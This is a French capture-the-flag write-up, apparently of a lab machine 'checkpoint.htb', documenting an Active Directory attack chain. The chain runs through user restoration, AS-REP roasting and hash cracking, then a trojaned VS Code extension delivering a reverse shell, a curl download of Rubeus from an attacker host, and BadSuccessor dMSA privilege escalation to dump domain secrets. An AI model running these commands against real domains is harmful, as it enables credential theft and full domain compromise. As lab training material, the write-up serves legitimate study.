
En venant faire de l'enumm, on se rend compte que la recycle bin est pas vide du tout 
Y'a un user, qu'on va venir restorer : 

bloodyAD \
  --host 10.129.156.90 \
  -d checkpoint.htb \
  -u alex.turner \
  -p 'Checkpoint2024!' \
  set restore \
  'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'

ensuite on vérifie qu'il a été restoré : 

nxc ldap 10.129.156.90 \
  -u alex.turner \
  -p 'Checkpoint2024!' \
  --query "(sAMAccountName=mark.davies)" "*"

on vient check sur ce quoi on a le droit d'écrire :

bloodyAD \
  --host 10.129.156.90 \
  -d checkpoint.htb \
  -u alex.turner \
  -p 'Checkpoint2024!' \
  get writable

on voit qu'on a les droits en write sur le user qu'on a restauré, donc on va venir le rendre asp roastable : 

bloodyAD \
  --host 10.129.156.90 \
  -d checkpoint.htb \
  -u alex.turner \
  -p 'Checkpoint2024!' \
  add uac \
  -f DONT_REQ_PREAUTH \
  mark.davies

pour vérifier : 

nxc ldap 10.129.156.90 \
  -u alex.turner \
  -p 'Checkpoint2024!' \
  --query "(sAMAccountName=mark.davies)" "userAccountControl"nxc ldap 10.129.156.90 \
  -u alex.turner \
  -p 'Checkpoint2024!' \
  --query "(sAMAccountName=mark.davies)" "userAccountControl"

on vérifie que la valeur a changé et que c'est mieux

Ensuite on déclenche la séquence d'ASP ROAST : 

impacket-GetNPUsers checkpoint.htb/ \
  -usersfile users.txt \
  -dc-ip 10.129.156.90 \
  -no-pass

on récupère le hash et on le pète avec hashcat : 

$krb5asrep$18$mark.davies$CHECKPOINT.HTB$bcc4398dcee2e31355bcd30c$54f76d1780f4a299bcde65fd48f850e0e654136dd0460f707bd0ce6fc96939664d79a6f44ca58e34e47f2252d79e928b07798a03058b9cf74531cd4e5167b131cb1a2fae378cb5519a13aa3cac81db4802cf3e99acc5e3f740e54a32920632f71dbff098abb5d4502be850345b77781d6518fdd8e129f56aba25c068f4a956fd2efc6fad483dcaadee303cf94974caed26a1481fc5ab59646edef730a9ac354ea961e5592cc3093e60256375d07948352b4f8eeed420ef0e33a165df5c1684f9333f6918b6fe09bcd6d8d36f7fcbe04944adc4de183e10b550fe876592b1d8ac1be00c98e40fe67c69af09d67d65dc56621ed6942a405f56


on fait une wordlist perso après avoir échouée sur rockyou : 

printf '%s\n' \
'Checkpoint' \
'Checkpoint2024' \
'Checkpoint2024!' \
'checkpoint' \
'checkpoint2024!' \
'Mark' \
'Mark2024!' \
'Davies2024!' > custom.txt

hashcat -m 32200 hash.txt custom.txt

et on voit que le mdp est reuse.. 

On vient ensuite enum ce qu'on peut faire sur les shares avec ce nouveau compte : 


nxc smb 10.129.156.90 -u mark.davies -p 'Checkpoint2024!' --shares  
smbclient //10.129.156.90/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!'

on a les accès en écriture sur le share DevDrop, il va falloir dev une extension qui va permettre d'avoir un rev shell.

On va donc la créer avec ce tool : 

npm install -g yo generator-code @vscode/vsce
yo code 
vsce package

On vient ensuite faire les modifications dans le package.json pour coller à la version demandée par le share 
et on vient modifier le extensions.json avec un b64 qui nous donne un reverse shell en tant que le user. 

Ensuite on va venir uploader avec smbclient la charge et lancer un reverse shell de l'autre côté : 

smbclient //10.129.156.90/DevDrop \
  -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
  -c 'put updater-0.0.1.vsix'


pour la privesc, on va énumérer les privilèges du user, du group, avant de venir continuer d'énumérer le ldap 


nxc ldap checkpoint.htb -u alex.turner -p 'Checkpoint2024!' -M badsuccessor

On a un hit dans l'OU : DMSAHolder
on va donc faire l'attaque de badsucessor sur le compte svc_deploy 


On crée le compte de service : 
$ou = [ADSI]"LDAP://OU=DMSAHolder,DC=checkpoint,DC=htb"
$dmsa = $ou.Children.Add("CN=evil_dmsa","msDS-DelegatedManagedServiceAccount")

$dmsa.Properties["msDS-DelegatedMSAState"].Value = 2
$dmsa.Properties["msDS-ManagedPasswordInterval"].Value = 30
$dmsa.Properties["dNSHostName"].Value = "evil_dmsa.checkpoint.htb"
$dmsa.Properties["sAMAccountName"].Value = "evil_dmsa$"
$dmsa.Properties["userAccountControl"].Value = 4096
$dmsa.Properties["msDS-ManagedAccountPrecededByLink"].Value = "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"

$dmsa.CommitChanges()


Ensuite on le lie au compte : 

Set-ADServiceAccount evil_dmsa -Add @{'msDS-ManagedAccountPrecededByLink'='CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb'}

ensuite on met l'état de migration à 2 pour dire terminé : 

Set-ADServiceAccount evil_dmsa -Replace @{'msDS-DelegatedMSAState'=2}


Ensuite on va passer par rubeus pour récupérer un ticket TGT 

curl.exe http://10.10.14.104:9000/Rubeus.exe -o C:\Users\ryan.brooks\Rubeus.exe

on vient donc récupérer notre ticket TGT pour s'en servir après pour l'attaque dmsa : 

.\Rubeus.exe tgtdeleg /nowrap
echo '<BASE64_TGT>' | base64 -d > /tmp/ryan.kirbi
impacket-ticketConverter /tmp/ryan.kirbi /tmp/ryan.ccache
export KRB5CCNAME=/tmp/ryan.ccache


bloodyAD \
  -k ccache=/tmp/ryan.ccache \
  -u ryan.brooks \
  -d checkpoint.htb \
  --host dc01.checkpoint.htb \
  add badSuccessor evilmsa \
  -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" \
  --ou "OU=DMSAHolder,DC=checkpoint,DC=htb"

on récupère la previous key de svc_deploy : 
e16081eb077aca74bdbf8af12af43ac9

Ensuite on utilise cette clé pour énumérer les shares et récupérer l'accès au share supplémentaire, on récupère la backup et on dump les secrets, on a la fin de la privesc. 